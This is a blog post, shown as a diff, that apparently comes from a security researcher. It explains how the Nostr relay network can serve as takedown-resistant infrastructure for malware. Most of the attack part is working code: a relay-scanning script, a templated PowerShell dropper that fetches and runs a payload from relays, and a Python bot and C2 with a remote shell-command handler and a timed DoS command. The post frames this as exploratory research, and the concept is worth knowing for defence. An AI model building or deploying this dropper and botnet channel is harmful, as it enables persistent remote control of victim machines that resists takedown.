@@ -33,7 +33,313 @@
     </header>
 
     <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l">
-      
+      <h3 id="intro">Intro</h3>
+<p><code>There's this protocol that lets you post content without censorship,  have you heard about it?</code></p>
+<p>While on vacation, a friend of mine mentioned this somewhat new protocol that lets you publish content as <strong><blue>Twitter-style</blue></strong> messages, and where you can subscribe to your own custom feeds, controlling the content you see.</p>
+<p>The key point? The messages you publish are designed to be resistant to deletion, and thus hard to censor, promoting freedom of speech.</p>
+<p>Immediately my curiosity was caught. Hold on, we can host content thats hard, if not impossible, to take down? That sounds like the perfect use case for <strong><red>malware</red></strong>. Lets take a deeper look.</p>
+<h2 id="what-is-nostr">What is Nostr</h2>
+<p>So what is this mysterious protocol &amp; network that lets us post <strong>content</strong> that <strong>can&rsquo;t be taken down</strong>?</p>
+<p><strong><i>Nostr</i></strong>, short for <u>Notes and Other Stuff Transmitted by Relays</u>, is a communication protocol that lets you publish and receive messages.</p>
+<p>At its core, <strong>Nostr</strong> is built around two concepts: <strong><blue>users<blue></strong> and <strong><yellow>relays<yellow></strong>. Users create messages, called events, and send them to relays. Other users can then request and read those events, from the relays. Unlike traditional social media platforms, there are no single central servers that can control the whole network or feeds.</p>
+<p>The <strong><blue>users<blue></strong> identity in Nostr is based on Cryptographic keys. Each user has a <strong><green>public key<green></strong> and a <strong><red>private key</red></strong>. The <strong><green>public key<green></strong> is the equivalent of a username, while the <strong><red>private key</red></strong> is used to prove that messages were created by that <strong><blue>users<blue></strong>. You can think of the <strong><red>Private Key</red></strong> as authentication, and the <strong><green>public key<green></strong> as the authority. This means that your identity on the Nostr protocol is not tied any identifiable information, and is not stored by one company.</p>
+<p><strong><yellow>Relays<yellow></strong> are servers that pass these messages between <strong><blue>users<blue></strong>. Any message can be either posted to one or multiple relays. If one relay stops storing or sharing that message, the same content could still be available through some another relays. This makes the protocol robust to censorship and central points of failure, because the content is not stored or controlled on one place.</p>
+<p>This is what makes <strong>Nostr</strong> interesting &ndash; it separates identity, content, and infrastructure. The user owns only their key, <strong><yellow>relays<yellow></strong> provide transport and storage, and then applications can decide how the content is displayed. Because of this, Nostr can be understood less as a single social network and more as a <u>shared communication layer for decentralized applications</u>.</p>
+<p>Keys that aren&rsquo;t tied to identifiable information, relays that don&rsquo;t coordinate, and content that persists &ndash; these are the key points that make Nostr interesting for more than notes. Keen eyed of you would already guess where this is going.</p>
+<h2 id="the-achilles-heel-of-malware">The Achilles Heel of malware</h2>
+<p>At my previous place of employment, we would tackle <strong><red>malware</red></strong> by essentially <u>take down requests</u>. Often times there&rsquo;s a dropper that compromises the victim via <strong><purple>phishing</purple></strong>, <strong><yellow>clickfix</yellow></strong>, or some other deceiving method for initial access. The dropper will then fetch the actual malware, or <strong><green>payload</green></strong>, from a C2 or some other relay.</p>
+<p>After or during the breach, once the dropper lands on the desk of <strong><blue>Incident Response</blue></strong>, its often times easy to go and cut the spread of the malice or the communication channel for the threat actor by filing a takedown request to where the malware or C2 is hosted. In an investigation by the authorities, it is possible to catch the <strong><red>Threat Actor</red></strong> by finding out who owns the infrastructure from which the malware was spread during the campaign.</p>
+<p>But what if the <b><red>Threat Actor</red></b> didn&rsquo;t own the infrastructure? What if the server from which the dropper fetches the malware from could not be <u>taken down?</u> Could an attacker make their malware (near) <strong>bulletproof</strong>?</p>
+<p>Of course I&rsquo;m not the first to think this. There&rsquo;s a <a href="https://github.com/ClarkQAQ/nrat">proof-of-concept from 2023</a> and <a href="https://nostr.com/nevent1qqsgfpwgp28xkcvgf0qelq5uywkd37t2sf8pufn5wcnd9s63nc8l9kszyzyfkx0tg0he3c6ut8n9tdwx0hq3hyr9pw4k69pp6p66a7llgktn7a3h8qp">even a mention of the idea on Nostr itself</a>.</p>
+<figure class="blog-img wide-img"><img src="/images/shaunscreenshot.png" width="800px">
+</figure>
+
+<p>But even so it seems the idea remains largely unexplored. Lets take a deeper look.</p>
+<h2 id="delivering-a-payload-via-multiple-possible-relays">Delivering a payload via multiple possible relays</h2>
+<p>The core idea of <strong><green>Nostr</green></strong> is that your Notes and Other stuff are Relayed &ndash; you push your content out into multiple nodes, which from anyone who wishes to, or you, can fetch them from using <strong><blue>your identity<blue></strong>, the <strong><green>Public Key</green></strong>. This feature is what makes our content <strong>&ldquo;bulletproof&rdquo;</strong>. Single takedown of a relay will only affect that relay. If we push our content into  <strong><yellow> 10 relays<yellow></strong>, to get our content off the internet there would have to be <strong><red>10 takedowns</red></strong> or bans from the relay owners. Meaning the more <strong><yellow>relays<yellow></strong> we use, the better.</p>
+<p>Interacting with a relay is quite simple:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  From interact.py, push()</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; First we create an identity:                   &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pynostr.key         <span style="color:#f92672">import</span> PrivateKey
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVATE_KEY <span style="color:#f92672">=</span> PrivateKey()
+</span></span><span style="display:flex;"><span>PUBLIC_KEY  <span style="color:#f92672">=</span> PRIVATE_KEY<span style="color:#f92672">.</span>public_key<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Afterwhich we can add the desired relay:       &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>relay_manager <span style="color:#f92672">=</span> RelayManager()
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>add_relay( relay )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Content is an signed event  &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>event <span style="color:#f92672">=</span> Event(
+</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> user_content
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>event<span style="color:#f92672">.</span>sign( PRIVATE_KEY<span style="color:#f92672">.</span>hex() )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; And then we can push the event into the relay: &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>publish_event( event )
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>run_sync()
+</span></span></code></pre></div><p>To later on fetch the content we&rsquo;ve just now pushed, we need to store the <code>PUBLIC_KEY</code>. That&rsquo;s the <strong><blue>&ldquo;username&rdquo;</blue></strong> equivalent of this network. Here&rsquo;s how we can fetch the content under that identity:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#  From interact.py, pull()</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Add the relay &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>relay_manager <span style="color:#f92672">=</span> RelayManager()
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>add_relay( relay )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># adjust filters where necessary</span>
+</span></span><span style="display:flex;"><span>filters <span style="color:#f92672">=</span> FiltersList([
+</span></span><span style="display:flex;"><span>    Filters(
+</span></span><span style="display:flex;"><span>        authors <span style="color:#f92672">=</span> [ PUBLIC_KEY ],
+</span></span><span style="display:flex;"><span>        kinds   <span style="color:#f92672">=</span> [ <span style="color:#ae81ff">1</span> ],
+</span></span><span style="display:flex;"><span>        limit   <span style="color:#f92672">=</span> <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Add a new &#39;subscription&#39; &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>sub_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;arbitrary_sub&#34;</span>
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>add_subscription_on_all_relays(sub_id, filters)
+</span></span><span style="display:flex;"><span>relay_manager<span style="color:#f92672">.</span>run_sync()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Get the Events &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> relay_manager<span style="color:#f92672">.</span>message_pool<span style="color:#f92672">.</span>has_events():
+</span></span><span style="display:flex;"><span>        raw_msg <span style="color:#f92672">=</span> relay_manager<span style="color:#f92672">.</span>message_pool<span style="color:#f92672">.</span>get_event()
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>In my proof of concept code, I only stripped the &ldquo;content&rdquo; part out of the raw_msg. This is the &ldquo;user_content&rdquo; part we pushed into the relay in the code snippet above. This is basically how you interact with <strong><green>Nostr</green></strong> &ndash; super simple!</p>
+<p>Now, lets find some <strong><yellow>relays<yellow></strong> to use. We need to find a list of <strong><yellow>relays<yellow></strong>, and <strong><green>enumerate</green></strong> through them to find the ones that can be used for free. We can abstract the above interactions into <code>push()</code> and <code>pull()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   scrape.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> relay <span style="color:#f92672">in</span> relays:
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Send a SHA of the Relay URL as a message into the relay.     &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    push( 
+</span></span><span style="display:flex;"><span>        user_content <span style="color:#f92672">=</span> shahify( relay ),
+</span></span><span style="display:flex;"><span>        relay        <span style="color:#f92672">=</span> relay,
+</span></span><span style="display:flex;"><span>        private_key  <span style="color:#f92672">=</span> PRIVATE_KEY,    
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Check the relay -- if the SHA of the relay is returned,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    it&#39;s open for free to use, 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    and doesn&#39;t mess with the integrity of the message.          &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> pull( 
+</span></span><span style="display:flex;"><span>        relay      <span style="color:#f92672">=</span> relay,
+</span></span><span style="display:flex;"><span>        public_key <span style="color:#f92672">=</span> PUBLIC_KEY,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> shahify( relay ) <span style="color:#f92672">==</span> msg:
+</span></span><span style="display:flex;"><span>        log( relay ) <span style="color:#75715e"># Store the result.</span>
+</span></span></code></pre></div><p>Now that we have a way to interact with the network, we can store our <strong><red>malware</red></strong> in there. Or could. Instead of storing <strong><blue>executables</blue></strong>, for now the <strong><green>proof-of-concept</green></strong> focuses on smaller payloads. The core idea is quite simple. We push our malicious payload into as many <strong><yellow>relays<yellow></strong> as we can, and the <strong><purple>implant/dropper</purple></strong> will try to fetch the payload from each one of them until it succeeds. This way, if some of them are taken down, as long as one of them has the payload, the <strong><purple>implant/dropper</purple></strong> is still operational.</p>
+<figure class="blog-img wide-img"><img src="/images/multiple_relays.png" width="900px">
+</figure>
+
+<p><strong><green>Pushing</green></strong> the content itself is now established, but lets look at how we can make the <strong><yellow>relays<yellow></strong> we know we&rsquo;ve pushed the <strong><red>malware</red></strong> into known by the <strong><purple>dropper</purple></strong>. For the sake of simplicity, the <strong><purple>implant/dropper</purple></strong> in this case is built as an <code>.ps1</code>. Initial Access is left as an exercise for the reader.</p>
+<p>There are two necessary variables for the dropper-<code>.ps1</code> file that enable it to fetch content from the Nostr network. Those are <code>PublicKey</code> and <code>Relay</code>. Because we want to try multiple <strong><yellow>relays<yellow></strong>, we will write them down to a list, and on the <strong><purple>dropper</purple></strong> try each one until we succeed in fetching the payload. We can use <strong><blue>Jinja</blue></strong> templates to put these details in place:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>$Relays = @(
+</span></span><span style="display:flex;"><span>{% for relay in relays %}
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;{{ relay }}&#34;</span>{% if not loop.last %},{% endif %}
+</span></span><span style="display:flex;"><span>{% endfor %}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$PublicKey = <span style="color:#e6db74">&#34;{{ publickey }}&#34;</span>
+</span></span></code></pre></div><p>And once we&rsquo;ve pushed the content into the relays, we store the relays into the list, and render it into the <code>.ps1</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># main.py</span>
+</span></span><span style="display:flex;"><span>dropper_file <span style="color:#f92672">=</span> render_malware( 
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;./templates/malw.ps1&#34;</span>, 
+</span></span><span style="display:flex;"><span>    relays, 
+</span></span><span style="display:flex;"><span>    PUBLIC_KEY 
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># render_malware.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> jinja2 <span style="color:#f92672">import</span> Template
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">render_malware</span>( template_path : str, relays : list, publickey : str ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Read the template</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Render the template</span>
+</span></span><span style="display:flex;"><span>    rendered_template <span style="color:#f92672">=</span> template<span style="color:#f92672">.</span>render(
+</span></span><span style="display:flex;"><span>        relays    <span style="color:#f92672">=</span> relays,
+</span></span><span style="display:flex;"><span>        publickey <span style="color:#f92672">=</span> publickey, 
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rendered_template
+</span></span></code></pre></div><p>Afterwhich we can simply write the template into a script file that we can <strong><blue>execute</blue></strong> on the victim host. If everything works as planned, upon the run, the payload is executed immediately after connection. Here we&rsquo;ve pushed a payload that opens <code>calc.exe</code> onto the network, and we run the <code>.ps1</code> on the victim windows host:</p>
+<figure class="blog-img"><img src="/images/nostr_demo.png" width="800px">
+</figure>
+
+<p>Lovely! But this is simple stuff. Lets push for something slightly more <strong><yellow>complex.</yellow></strong></p>
+<h2 id="bots--skid-malware">Bots &amp; Skid malware</h2>
+<p>For the next section we have to take a brief look into <strong><red>botnets</red></strong> of the past. Back when I was younger, I used to lurk on all sorts of <strong><yellow>cyberforums</yellow></strong> and chats. Back then, it was common to boast about how capable your &ldquo;booter&rdquo; (DoS tool) was, or how many bots you have in your <strong><red>botnet</red></strong>. At the time, these were often quite simple setups that were thoroughly glazed for street rep:</p>
+<figure class="blog-img"><img src="/images/boats.png" width="800px">
+</figure>
+
+<p>There were scripts floating around that showcased the basic methodology. To build a small net, exactly as the picture above shows, the attacker would take a <strong><yellow>CVE</yellow></strong> with an <strong><red>RCE</red></strong>, craft an exploit that takes control of the host and launches a bot-process, that then connects to an <strong><green>IRC</green></strong> server of their choosing. After testing that it works locally, they would scan the web for that specific <strong><purple>vulnerability<purple></strong> and spread to as many servers as possible. The bots would have certain commands built in, such as &ldquo;!attack&rdquo;, &ldquo;!udp&rdquo;, &ldquo;!tcp&rdquo;, and so on. If seen in the <strong><green>IRC</green></strong> chat posted by the &ldquo;admin&rdquo; user, the bot would launch a corresponding attack on the chosen target.</p>
+<p>This is the structure we&rsquo;re going to reproduce &ndash; <strong><yellow>a command channel</yellow></strong> for the operator, with bots that listen and act. The only difference is that we&rsquo;re swapping <strong><green>IRC</green></strong> for something that can&rsquo;t be taken down with one action.</p>
+<h2 id="using-nostr-for-comms-on-a-botnet">Using Nostr for comms on a botnet</h2>
+<p>One-way communication channel from the Attacker to the Bot is perfect for exactly this use. When the <strong><red>Threat Actor</red></strong> wants to launch a <strong><red>DDoS attack</red></strong> for example, there isn&rsquo;t a need for a response from the bot side &ndash; it&rsquo;s only required to be able to relay the target address, the attack type and attack time to the bot.</p>
+<p>For simplicity, let&rsquo;s use the ever lovely &amp; verbose <strong><blue>Python</blue></strong> for this Bot &amp; C2. We can begin by defining the different commands on the bot:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; COMMANDS &#34;&#34;&#34;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack</span>( args : str ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Args should be a string in format of:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#34;target,timestamp&#34; -&gt; &#34;victim.org,13333337&#34;</span>
+</span></span><span style="display:flex;"><span>    params            <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>)
+</span></span><span style="display:flex;"><span>    target, timestamp <span style="color:#f92672">=</span> str( params[ <span style="color:#ae81ff">0</span> ] ), int( params[ <span style="color:#ae81ff">1</span> ]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>] ) 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Wait for the timestamp to pass.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> time<span style="color:#f92672">.</span>time() <span style="color:#f92672">&lt;</span> round(timestamp):
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># booo! scary DoS attack.</span>
+</span></span><span style="display:flex;"><span>    _ <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get( <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cli</span>( args ): 
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system( args )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disconnect</span>( _ ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># os.system( &#34;rm ./*.py&#34; ); os.system( &#34;rm ./*pycache*&#34; )</span>
+</span></span><span style="display:flex;"><span>    exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; Bind the function calls into keys &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>COMMANDS <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;cli&#34;</span>        : cli,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;attack&#34;</span>     : attack,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;disconnect&#34;</span> : disconnect, 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Because the <strong><yellow>relays<yellow></strong> don&rsquo;t work instantaneously, sometimes some bots could get their command significantly faster than the rest. For a <strong><red>denial of service attack</red></strong> it&rsquo;s crucial to try and pump as many packets at once as possible, so we have to implement a <strong><green>timestamp</green></strong> to wait for before the attack is launched. Since we want to keep everything as simple as possible, we want to use only strings as args for the functions. For multiple args, we can simply use <strong><purple>CSV</purple></strong> style of encoding, where we split each argument with a comma.</p>
+<p>The bot needs to be connected to the <strong><blue>network</blue></strong> for it to be able to receive the <strong><yellow>commands</yellow></strong>. We can implement a loop that iterates through the possible relays, and tries to acquire the command.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Global Variables</span>
+</span></span><span style="display:flex;"><span>HEARTBEAT : int  <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">*</span> random<span style="color:#f92672">.</span>randint( <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">15</span> )
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Iterate through the relays. </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Upon first successful play of the command,</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># stop and wait for a new one.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> relay <span style="color:#f92672">in</span> RELAYS:
+</span></span><span style="display:flex;"><span>        messages <span style="color:#f92672">=</span>  pull(
+</span></span><span style="display:flex;"><span>            relay      <span style="color:#f92672">=</span> relay,
+</span></span><span style="display:flex;"><span>            public_key <span style="color:#f92672">=</span> C2_PUBLIC_KEY, 
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># No message received from the relay.</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Do not replay seen messages.</span>
+</span></span><span style="display:flex;"><span>        last_message      <span style="color:#f92672">=</span> pick_last( messages )
+</span></span><span style="display:flex;"><span>        last_message_hash <span style="color:#f92672">=</span> hash(str(last_message))
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> last_message_hash <span style="color:#f92672">in</span> messages_seen:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Mark message seen and play it. </span>
+</span></span><span style="display:flex;"><span>        messages_seen[ last_message_hash ] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Execute command is opened further below</span>
+</span></span><span style="display:flex;"><span>        execute_command( last_message ) 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Heartbeat to reduce noise.</span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep( HEARTBEAT )
+</span></span></code></pre></div><p>This is slightly <strong><blue><u>noisy</u></blue></strong>, making detection easier. To remedy it ever so slightly, we can vary the interval for the fetch with <code>HEARTBEAT</code> and any <strong><red>attack</red></strong> we launch we couple with a target time.</p>
+<p>Now let&rsquo;s look at the C2 side:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34; ACTIONS / COMMANDS &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cli_command</span>( user_input ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># CLI command can be sent as is.</span>
+</span></span><span style="display:flex;"><span>    nostr_connection<span style="color:#f92672">.</span>send_payload({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;args&#34;</span>    : user_input,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;command&#34;</span> : <span style="color:#e6db74">&#34;cli&#34;</span>    
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack_command</span>( user_input ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># attack command requires a CSV format: </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#34;VICTIM,TIMESTAMP&#34; because of the heartbeat.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Not every bot will receive the command at the</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># same time, which we can remedy by setting </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># a unix timestamp as the &#34;goal&#34; for the time</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># of the attack.</span>
+</span></span><span style="display:flex;"><span>    nostr_connection<span style="color:#f92672">.</span>send_payload({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;args&#34;</span>    : user_input <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;,&#34;</span> <span style="color:#f92672">+</span> str( time<span style="color:#f92672">.</span>time() <span style="color:#f92672">+</span> <span style="color:#ae81ff">60</span> ),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;command&#34;</span> : <span style="color:#e6db74">&#34;attack&#34;</span>    
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disconnect</span>( _ ):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># No user input required ; ignore it.</span>
+</span></span><span style="display:flex;"><span>    nostr_connection<span style="color:#f92672">.</span>send_payload({
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;args&#34;</span>    : <span style="color:#e6db74">&#34;_&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;command&#34;</span> : <span style="color:#e6db74">&#34;disconnect&#34;</span>    
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># After connection, </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># all bots connecting are gonna disconnect upon new entry.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If you wish to start the net again, send a padding:</span>
+</span></span><span style="display:flex;"><span>    nostr_connection<span style="color:#f92672">.</span>send_payload({ <span style="color:#e6db74">&#34;padding&#34;</span> : <span style="color:#e6db74">&#34;padding&#34;</span> })
